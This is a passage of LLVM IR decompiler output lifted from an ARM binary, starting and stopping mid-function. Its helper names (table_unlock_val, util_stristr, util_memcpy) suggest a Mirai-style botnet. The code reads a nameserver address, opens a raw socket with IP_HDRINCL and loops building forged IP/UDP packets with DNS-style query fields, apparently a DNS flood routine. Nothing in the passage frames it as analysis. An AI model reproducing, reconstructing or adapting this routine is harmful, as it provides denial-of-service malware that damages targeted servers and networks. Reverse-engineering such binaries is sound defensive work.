  %v1_a634 = call i32 @__GI___libc_close(i32 %v0_a630)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a63c = call i32 @table_unlock_val(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a648 = call i32 @table_retrieve_val(i32 22, i32* null)
  %v0_a64c = load i32, i32* @r5, align 4
  store i32 %v0_a64c, i32* @r1, align 4
  store i32 %v3_a648, i32* %r2.global-to-local, align 4
  store i32 %v2_a618, i32* %r0.global-to-local, align 4
  %v3_a658 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a658 = call i32 @util_stristr(i8* %v3_a658, i32 %v0_a64c, i32 %v3_a648)
  store i32 %v4_a658, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 22)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v0_a668 = load i32, i32* @r6, align 4
  %v7_a668 = icmp eq i32 %v0_a668, -1
  store i1 %v7_a668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a668, label %dec_label_pc_ab04, label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %dec_label_pc_a614
  %v0_a670 = load i32, i32* @r5, align 4
  %v9_a670 = icmp eq i32 %v0_a670, %v0_a668
  store i1 %v9_a670, i1* %cpsr_z.global-to-local, align 1
  %v7_a674 = icmp sgt i32 %v0_a670, %v0_a668
  br i1 %v7_a674, label %dec_label_pc_a678, label %dec_label_pc_ab04

dec_label_pc_a678:                                ; preds = %dec_label_pc_a670
  %v0_a678 = load i32, i32* @sl, align 4
  %v2_a678 = add i32 %v0_a678, %v0_a668
  store i32 %v2_a678, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a670, -1
  br label %dec_label_pc_a69c

dec_label_pc_a688:                                ; preds = %dec_label_pc_a6c4, %bb103
  %v9_a688 = icmp eq i32 %v1_a6a4, %v0_a690
  store i1 %v9_a688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a688, label %dec_label_pc_a6d0, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a6b4, %dec_label_pc_a688, %bb
  %v0_a6c029 = phi i32 [ %v0_a6c0, %dec_label_pc_a6b4 ], [ %v0_a6c030, %dec_label_pc_a688 ], [ %v0_a6c0, %bb ]
  %v0_a6a025 = phi i32 [ 0, %dec_label_pc_a6b4 ], [ %v0_a6a026, %dec_label_pc_a688 ], [ 0, %bb ]
  %v1_a690 = add i32 %v0_a690, 1
  store i32 %v1_a690, i32* @r4, align 4
  %v9_a694 = icmp eq i32 %v1_a690, %v0_a670
  store i1 %v9_a694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a694, label %dec_label_pc_ab04, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a678
  %v0_a690 = phi i32 [ %v1_a690, %dec_label_pc_a690 ], [ %v0_a668, %dec_label_pc_a678 ]
  %v0_a6c0 = phi i32 [ %v0_a6c029, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a0 = phi i32 [ %v0_a6a025, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a8 = phi i32 [ %v1_a6a8, %dec_label_pc_a690 ], [ %v2_a678, %dec_label_pc_a678 ]
  %v1_a69c = inttoptr i32 %v0_a6a8 to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v3_a69c = zext i8 %v2_a69c to i32
  store i32 %v3_a69c, i32* %r3.global-to-local, align 4
  %v2_a6a0 = icmp eq i32 %v0_a6a0, 0
  store i1 %v2_a6a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  %v1_a6a8 = add i32 %v0_a6a8, 1
  store i32 %v1_a6a8, i32* %r2.global-to-local, align 4
  %v1_a6ac = add nsw i32 %v3_a69c, -48
  store i32 %v1_a6ac, i32* %r1.global-to-local, align 4
  br i1 %v2_a6a0, label %dec_label_pc_a6b4, label %dec_label_pc_a6c4

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a69c
  %v7_a6b4 = icmp eq i8 %v2_a69c, 9
  store i1 %v7_a6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6b4, label %dec_label_pc_a690, label %bb

bb:                                               ; preds = %dec_label_pc_a6b4
  %v8_a6b8 = icmp eq i8 %v2_a69c, 32
  store i1 %v8_a6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a6b8, label %dec_label_pc_a690, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %bb
  %v1_a6c0 = add i32 %v0_a6c0, 1
  store i32 %v1_a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a6c0
  %v0_a6c030 = phi i32 [ %v0_a6c0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v0_a6a026 = phi i32 [ %v0_a6a0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v7_a6c4 = icmp eq i8 %v2_a69c, 46
  store i1 %v7_a6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c4, label %dec_label_pc_a688, label %bb103

bb103:                                            ; preds = %dec_label_pc_a6c4
  %v8_a6c8 = icmp eq i32 %v1_a6ac, 9
  store i1 %v8_a6c8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a6ac, 10
  br i1 %tmp, label %dec_label_pc_a688, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a688, %bb103
  %v0_a690.lcssa = phi i32 [ %v1_a6a4, %dec_label_pc_a688 ], [ %v0_a690, %bb103 ]
  %v2_a6d4 = sub i32 %v0_a690.lcssa, %v0_a668
  store i32 %v2_a6d4, i32* @r4, align 4
  %v2_a6d8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a678, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d8, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @util_memcpy(i32 %v2_a6d8, i32 %v2_a678, i32 %v2_a6d4)
  %v2_a6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6f0 = load i32, i32* @r4, align 4
  %v2_a6f0 = add i32 %v1_a6f0, %v2_a6ec
  store i32 %v2_a6f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a6d8, i32* @r0, align 4
  %v3_a6fc = add i32 %v2_a6f0, -36
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 0, i8* %v4_a6fc, align 1
  %v1_a700 = call i32 @inet_addr(i32 %v2_a6d8)
  store i32 %v1_a700, i32* %r0.global-to-local, align 4
  store i32 %v1_a700, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_a70811:                              ; preds = %dec_label_pc_ab04
  unreachable

dec_label_pc_a708:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_ab60, %dec_label_pc_ab50, %dec_label_pc_ab40, %dec_label_pc_a6d0
  %v1_ab3c49 = phi i32 [ %v1_ab08, %dec_label_pc_ab6c ], [ %v1_ab08, %dec_label_pc_ab60 ], [ %v1_ab08, %dec_label_pc_ab50 ], [ %v1_ab08, %dec_label_pc_ab40 ], [ %v1_a700, %dec_label_pc_a6d0 ]
  %v0_a708 = load i32, i32* @r7, align 4
  %v2_a708 = icmp eq i32 %v0_a708, 0
  store i1 %v2_a708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a708, label %dec_label_pc_ab30, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a708
  store i32 %v0_a708, i32* %r0.global-to-local, align 4
  %v1_a714 = inttoptr i32 %v0_a708 to i8*
  %v2_a714 = call i32 @util_strlen(i8* %v1_a714)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a714, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a728 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v7_a72c = icmp eq i32 %v3_a728, -1
  store i1 %v7_a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a72c, label %dec_label_pc_ab30, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a710
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a740, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a754 = call i32 @__GI_setsockopt(i32 %v3_a728, i32 0, i32 3, i32 %v6_a740, i32 4)
  store i32 %v5_a754, i32* %r0.global-to-local, align 4
  %v7_a758 = icmp eq i32 %v5_a754, -1
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a758, label %dec_label_pc_ab28, label %dec_label_pc_a760

dec_label_pc_a760:                                ; preds = %dec_label_pc_a738
  %v0_a768 = load i32, i32* %sb.global-to-local, align 4
  %v1_a768 = urem i32 %v0_a768, 256
  store i32 %v1_a768, i32* %sb.global-to-local, align 4
  %v3_a770 = mul i32 %v6_a578, 65536
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  %v5_a77c = trunc i32 %v0_a768 to i8
  %v0_a780 = load i32, i32* @r8, align 4
  %v2_a780 = icmp eq i32 %v0_a780, 0
  store i1 %v2_a780, i1* %cpsr_z.global-to-local, align 1
  %v3_a784 = urem i32 %v7_a51c, 65536
  store i32 %v3_a784, i32* %r0.global-to-local, align 4
  %v3_a78c = urem i32 %v6_a578, 65536
  store i32 %v3_a78c, i32* %r2.global-to-local, align 4
  %v3_a790 = mul i32 %v6_a590, 65536
  %v3_a794 = mul i32 %v6_a5ac, 65536
  store i32 %v3_a794, i32* %ip.global-to-local, align 4
  br i1 %v2_a780, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a760
  %v5_a79c = sext i8 %v5_a77c to i32
  store i32 %v5_a79c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a760, %bb104
  %v2_a7c8 = phi i32 [ %v3_a78c, %dec_label_pc_a760 ], [ %v5_a79c, %bb104 ]
  %v3_a7a8 = urem i32 %v6_a590, 65536
  store i32 %v3_a7a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a7b0 = urem i32 %v6_a5ac, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a7c8 = load i32, i32* @r6, align 4
  br i1 %v2_a780, label %.dec_label_pc_a9b0.preheader_crit_edge, label %dec_label_pc_a7d0

.dec_label_pc_a9b0.preheader_crit_edge:           ; preds = %bb105
  %v3_a7c8 = add i32 %v1_a7c8, %v2_a7c8
  store i32 %v3_a7c8, i32* @r7, align 4
  %.pre = sext i8 %v5_a77c to i32
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a7d0:                                ; preds = %bb105
  %v2_a7d0 = add i32 %v1_a7c8, %v1_a768
  %v3_a7d4 = mul i32 %v2_a7d0, 65536
  %v1_a7dc = add i32 %v3_a7d4, 1769472
  %v1_a7e0 = add i32 %v3_a7d4, 3080192
  %tmp106 = udiv i32 %v1_a7e0, 256
  %v3_a7f4 = and i32 %tmp106, 65280
  %v4_a804 = udiv i32 %v1_a7e0, 16777216
  %v5_a804 = or i32 %v3_a7f4, %v4_a804
  store i32 %v5_a804, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a578 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a51c, 256
  %v3_a818 = and i32 %tmp107, 65280
  store i32 %v3_a818, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a51c, 256
  %v4_a81c = urem i32 %tmp108, 256
  %v5_a81c = or i32 %v4_a81c, %v3_a818
  store i32 %v5_a81c, i32* @sb, align 4
  store i32 %v3_a794, i32* %r2.global-to-local, align 4
  store i32 %v3_a790, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a590, 256
  %v3_a830 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a5ac, 256
  %v3_a834 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a7dc, 256
  %v3_a838 = and i32 %tmp111, 65280
  store i32 %v3_a838, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a590, 256
  %v4_a83c = urem i32 %tmp112, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a830
  store i32 %v5_a83c, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a5ac, 256
  %v4_a840 = urem i32 %tmp113, 256
  %v5_a840 = or i32 %v4_a840, %v3_a834
  store i32 %v5_a840, i32* @r4, align 4
  %v1_a844 = add i32 %v1_a7c8, 1
  store i32 %v1_a844, i32* %r3.global-to-local, align 4
  %v4_a848 = udiv i32 %v1_a7dc, 16777216
  %v5_a848 = or i32 %v4_a848, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4f8, 16777216
  %v4_a8a0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a534, 16777216
  %v4_a8ac = sdiv i32 %sext8, 16777216
  %v4_a8cc = sext i8 %v5_a77c to i32
  %sext9 = mul nuw i32 %v5_a83c, 65536
  %v7_a8e0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a840, 65536
  %v4_a908 = sdiv i32 %sext10, 65536
  %v1_a8a8 = trunc i32 %v4_a8a0 to i8
  %extract.t = trunc i32 %v4_a8ac to i8
  %v1_a8d0 = add nsw i32 %v4_a8cc, 41
  %sext120 = mul i32 %v5_a848, 65536
  %v3_a8e0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a980, %dec_label_pc_a7d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a868 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_a868, i32* %r0.global-to-local, align 4
  store i32 %v2_a4e0, i32* %ip.global-to-local, align 4
  %v3_a870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v2_a874 = load i32, i32* @r5, align 4
  %v5_a874 = mul i32 %v2_a874, 4
  %v6_a874 = add i32 %v5_a874, %v2_a4e0
  %v7_a874 = inttoptr i32 %v6_a874 to i32*
  store i32 %v2_a868, i32* %v7_a874, align 4
  %v0_a878 = load i32, i32* %ip.global-to-local, align 4
  %v1_a878 = load i32, i32* %r3.global-to-local, align 4
  %v4_a878 = mul i32 %v1_a878, 4
  %v5_a878 = add i32 %v4_a878, %v0_a878
  %v6_a878 = inttoptr i32 %v5_a878 to i32*
  %v7_a878 = load i32, i32* %v6_a878, align 4
  store i32 %v7_a878, i32* %r1.global-to-local, align 4
  %v1_a87c = inttoptr i32 %v7_a878 to i8*
  %v2_a87c = load i8, i8* %v1_a87c, align 1
  %tmp127 = urem i8 %v2_a87c, 16
  %v1_a880 = zext i8 %tmp127 to i32
  %v1_a884 = or i32 %v1_a880, 64
  store i32 %v1_a884, i32* %r2.global-to-local, align 4
  %v1_a888 = trunc i32 %v1_a884 to i8
  store i8 %v1_a888, i8* %v1_a87c, align 1
  %v0_a88c = load i32, i32* %r1.global-to-local, align 4
  %v1_a88c = inttoptr i32 %v0_a88c to i8*
  %v2_a88c = load i8, i8* %v1_a88c, align 1
  %v3_a88c = zext i8 %v2_a88c to i32
  %v1_a890 = and i32 %v3_a88c, 240
  %v1_a894 = or i32 %v1_a890, 5
  store i32 %v1_a894, i32* %r3.global-to-local, align 4
  store i32 %v1_a560, i32* %lr.global-to-local, align 4
  %v1_a89c = trunc i32 %v1_a894 to i8
  store i8 %v1_a89c, i8* %v1_a88c, align 1
  store i32 %v4_a8a0, i32* %r0.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %lr.global-to-local, align 4
  %v2_a8a4 = icmp eq i32 %v0_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 1
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  store i32 %v4_a8ac, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a8b0, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a860
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_a8b4 = add i32 %v3_a8b4, 6
  %v5_a8b4 = inttoptr i32 %v4_a8b4 to i16*
  store i16 64, i16* %v5_a8b4, align 2
  %v0_a8bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a8bc.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a860, %bb114
  %v0_a8bc.off0 = phi i8 [ %extract.t, %dec_label_pc_a860 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 8
  %v4_a8bc = inttoptr i32 %v3_a8bc to i8*
  store i8 %v0_a8bc.off0, i8* %v4_a8bc, align 1
  %v0_a8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8c0 = trunc i32 %v0_a8c0 to i8
  %v2_a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8c0 = add i32 %v2_a8c0, 9
  %v4_a8c0 = inttoptr i32 %v3_a8c0 to i8*
  store i8 %v1_a8c0, i8* %v4_a8c0, align 1
  %v2_a8c8 = load i32, i32* @global_var_241f0.57, align 4
  %v0_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8d4 = add i32 %v1_a8d0, %v0_a8d0
  store i32 %v2_a8d4, i32* @r4, align 4
  %v2_a8d8 = add i32 %v0_a8d0, 12
  %v3_a8d8 = inttoptr i32 %v2_a8d8 to i32*
  store i32 %v2_a8c8, i32* %v3_a8d8, align 4
  store i32 %v3_a8e0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8e0, i32* %r3.global-to-local, align 4
  %v0_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e4 = add i32 %v0_a8e4, 20
  store i32 %v1_a8e4, i32* %ip.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i16
  %v3_a8e8 = add i32 %v0_a8e4, 2
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i16*
  store i16 %v1_a8e8, i16* %v4_a8e8, align 2
  %v0_a8ec = load i32, i32* @sb, align 4
  %v1_a8ec = trunc i32 %v0_a8ec to i16
  %v2_a8ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 4
  %v4_a8ec = inttoptr i32 %v3_a8ec to i16*
  store i16 %v1_a8ec, i16* %v4_a8ec, align 2
  %v0_a8f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8f0 = trunc i32 %v0_a8f0 to i16
  %v2_a8f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f0 = add i32 %v2_a8f0, 4
  %v4_a8f0 = inttoptr i32 %v3_a8f0 to i16*
  store i16 %v1_a8f0, i16* %v4_a8f0, align 2
  %v0_a8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8f4 = trunc i32 %v0_a8f4 to i16
  %v2_a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f4 = add i32 %v2_a8f4, 2
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i16*
  store i16 %v1_a8f4, i16* %v4_a8f4, align 2
  %v2_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8fc = add i32 %v2_a8fc, 20
  %v4_a8fc = inttoptr i32 %v3_a8fc to i16*
  store i16 %rev, i16* %v4_a8fc, align 2
  store i32 %v4_a8cc, i32* %ip.global-to-local, align 4
  %v0_a904 = load i32, i32* %r1.global-to-local, align 4
  %v1_a904 = add i32 %v0_a904, 28
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  store i32 %v4_a908, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a914 = add i32 %v0_a904, 30
  %v4_a914 = inttoptr i32 %v3_a914 to i16*
  store i16 1, i16* %v4_a914, align 2
  %v0_a918 = load i32, i32* @lr, align 4
  %v1_a918 = trunc i32 %v0_a918 to i16
  %v2_a918 = load i32, i32* %r0.global-to-local, align 4
  %v3_a918 = add i32 %v2_a918, 4
  %v4_a918 = inttoptr i32 %v3_a918 to i16*
  store i16 %v1_a918, i16* %v4_a918, align 2
  %v0_a91c = load i32, i32* %ip.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r1.global-to-local, align 4
  %v3_a91c = add i32 %v2_a91c, 40
  %v4_a91c = inttoptr i32 %v3_a91c to i8*
  store i8 %v1_a91c, i8* %v4_a91c, align 1
  %v0_a920 = load i32, i32* @fp, align 4
  %v1_a920 = load i32, i32* %r1.global-to-local, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v0_a920, i32* %v3_a920, align 4
  %v0_a924 = load i32, i32* %r3.global-to-local, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v2_a924 = load i32, i32* %r1.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 28
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* @r4, align 4
  %v1_a928 = add i32 %v0_a928, 1
  store i32 %v1_a928, i32* %r0.global-to-local, align 4
  %v0_a92c = load i32, i32* @r7, align 4
  store i32 %v0_a92c, i32* %r1.global-to-local, align 4
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v3_a934 = call i32 @util_memcpy(i32 %v1_a928, i32 %v0_a92c, i32 %v1_a844)
  store i32 %v3_a934, i32* %r0.global-to-local, align 4
  %v0_a938 = load i32, i32* @r6, align 4
  %v2_a938 = icmp eq i32 %v0_a938, 0
  store i1 %v2_a938, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a938, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a948

bb116:                                            ; preds = %.thread13
  %v5_a93c = load i32, i32* @r4, align 4
  store i32 %v5_a93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a980

dec_label_pc_a948:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %.thread20, %dec_label_pc_a948
  %v0_a960 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v0_a964 = phi i32 [ %v0_a978, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v1_a954 = load i32, i32* @r7, align 4
  %v2_a954 = add i32 %v1_a954, %v0_a964
  %v3_a954 = inttoptr i32 %v2_a954 to i8*
  %v4_a954 = load i8, i8* %v3_a954, align 1
  %v6_a954 = zext i8 %v4_a954 to i32
  store i32 %v6_a954, i32* %r3.global-to-local, align 4
  %v7_a958 = icmp eq i8 %v4_a954, 46
  store i1 %v7_a958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a958, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a954
  %v1_a96016 = add nsw i32 %v0_a960, 1
  store i32 %v1_a96016, i32* %r2.global-to-local, align 4
  %v1_a96418 = add i32 %v0_a964, 1
  store i32 %v1_a96418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a954
  %v2_a95c = load i32, i32* @r4, align 4
  %v3_a95c = add i32 %v2_a95c, %v0_a964
  store i32 %v3_a95c, i32* %r3.global-to-local, align 4
  %v1_a960 = add nsw i32 %v0_a960, 1
  store i32 %v1_a960, i32* %r2.global-to-local, align 4
  %v1_a964 = add i32 %v0_a964, 1
  store i32 %v1_a964, i32* %r1.global-to-local, align 4
  %v2_a968 = trunc i32 %v0_a960 to i8
  %v3_a968 = load i32, i32* %r0.global-to-local, align 4
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v2_a968, i8* %v4_a968, align 1
  %v0_a96c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a96c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a96c = phi i32 [ %v1_a96c.pre, %bb117.bb118_crit_edge ], [ %v1_a96016, %.thread59 ]
  %v2_a96c = urem i32 %v1_a96c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a970 = load i32, i32* %r3.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 1
  store i32 %v2_a970, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a96c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a978 = load i32, i32* %r1.global-to-local, align 4
  %v1_a978 = load i32, i32* @r6, align 4
  %v9_a978 = icmp eq i32 %v0_a978, %v1_a978
  store i1 %v9_a978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a978, label %dec_label_pc_a980.loopexit, label %dec_label_pc_a954

dec_label_pc_a980.loopexit:                       ; preds = %.thread20
  %v2_a980.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %bb116, %dec_label_pc_a980.loopexit
  %v0_a980.off0 = phi i8 [ %extract.t126, %dec_label_pc_a980.loopexit ], [ 0, %bb116 ]
  %v2_a980 = phi i32 [ %v2_a980.pre, %dec_label_pc_a980.loopexit ], [ %v5_a93c, %bb116 ]
  %v3_a980 = inttoptr i32 %v2_a980 to i8*
  store i8 %v0_a980.off0, i8* %v3_a980, align 1
  %v3_a984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a984, i32* %r3.global-to-local, align 4
  %v1_a988 = add i32 %v3_a984, 1
  store i32 %v1_a988, i32* @r5, align 4
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* @r6, align 4
  %v2_a98c = add i32 %v1_a98c, %v0_a98c
  store i32 %v2_a98c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a994 = load i32, i32* @r8, align 4
  %v9_a994 = icmp eq i32 %v0_a994, %v1_a988
  store i1 %v9_a994, i1* %cpsr_z.global-to-local, align 1
  %v3_a998 = add i32 %v2_a98c, 4
  %v4_a998 = inttoptr i32 %v3_a998 to i16*
  store i16 256, i16* %v4_a998, align 2
  %v0_a99c = load i32, i32* @lr, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v2_a99c = load i32, i32* %r2.global-to-local, align 4
  %v3_a99c = add i32 %v2_a99c, 2
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %stack_var_-44, align 4
  %v8_a9a4 = icmp sgt i32 %v0_a994, %v1_a988
  br i1 %v8_a9a4, label %dec_label_pc_a860, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a980
  store i32 %v4_a8cc, i32* %r0.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r6, align 4
  %v2_a9ac = add i32 %v0_a9ac, %v4_a8cc
  store i32 %v2_a9ac, i32* @r7, align 4
  %v0_a9b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.dec_label_pc_a9b0.preheader_crit_edge, %dec_label_pc_a9a8
  %v4_aa14.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v4_a8cc, %dec_label_pc_a9a8 ]
  %v0_a9b4.pre = phi i32 [ 0, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v0_a9b4.pre.pre, %dec_label_pc_a9a8 ]
  %v3_a9e0 = icmp eq i32 %v3_a784, 65535
  %v3_a9f0 = icmp eq i32 %v3_a78c, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8, %dec_label_pc_a9b0.preheader
